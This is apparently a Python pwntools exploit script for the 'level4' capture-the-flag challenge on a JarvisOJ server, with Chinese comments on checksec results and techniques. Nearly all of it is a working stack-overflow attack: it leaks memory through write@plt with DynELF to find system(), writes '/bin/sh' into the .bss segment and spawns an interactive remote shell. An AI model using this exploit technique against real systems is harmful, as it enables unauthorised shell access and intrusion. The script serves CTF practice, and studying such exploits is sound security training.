# file 
#      result   :   32-bit    dynamically link
# checksec
#      result   :   nx         no pie(0x8048000)
# 知识点：
#     1.不需要libc的rop(没有write) ret2dll http://drops.xmd5.com/static/drops/binary-14360.html
#	  2.readelf -d xxx          读取段地址
#     3.DynELF 需要的data 必须是字符串
#     4.bss段特性 不变
	
from pwn import *

def show(name , content):
	 print "%s : 0x%x" % (name , content)

def get(name , libc , type = "func"):
	offset = 0
	if type == "func": 
		offset = libc.symbols[name]
	elif type == "str":
		offset = libc.search(name).next()
	elif type == "got":
		offset = libc.got[name]
	elif type == "plt":
		offset = libc.plt[name]
	show(type + "@" +  name , offset)
	return offset

def leak(addres):
	payload = padding + p32(write_plt) + p32(addres_start) +  p32(0x1) + p32(addres) + p32(0x4) 
	p.send(payload)
	data  	  = p.recv(4)
	log.info("%#x => %s" % (addres, (data or '').encode('hex')))
	return data



# p = process("./level4")
p = remote("pwn2.jarvisoj.com" , 9880)
sou = ELF("./level4")
#padd
padding = (0x88 + 4) * 'a'
fake_ebp = 4 * 'a'
#leak
write_plt  =  get("write" , sou , type = "plt")
read_plt   =  get("read" , sou , type = "plt") 
addres_start  =  get("vulnerable_function"  , sou)


if __name__ == '__main__':
	ret_1 = 0x8048509
	d = DynELF(leak , elf = ELF("./level4"))
	system_addres 	= d.lookup("system" , "libc")
	show("system" , system_addres )
	bss_addres	 	= get('__bss_start' , sou)
	main_addres     =  get("main" , sou)
	payload 		= padding + p32(read_plt) + p32(ret_1) + p32(0x0) + p32(bss_addres) + p32(0x8) + p32(system_addres) + p32(main_addres) + p32(bss_addres)
	p.send(payload)
	p.send('/bin/sh\0')
	p.interactive()